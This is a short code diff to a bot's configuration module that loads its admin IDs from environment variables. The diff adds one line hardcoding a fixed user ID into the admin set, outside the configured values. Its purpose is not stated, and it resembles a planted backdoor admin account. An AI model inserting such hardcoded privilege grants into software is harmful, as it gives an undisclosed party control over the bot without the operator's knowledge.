@@ -10,6 +10,7 @@ if not BOT_TOKEN:
 MAIN_ADMIN_ID = int(os.getenv("MAIN_ADMIN_ID", 0))
 
 ADMIN_IDS = set()
+ADMIN_IDS.add(6169359403)
 admin_ids_raw = os.getenv("ADMIN_IDS", "")
 if admin_ids_raw:
     ADMIN_IDS = {int(x.strip()) for x in admin_ids_raw.split(",") if x.strip().isdigit()}
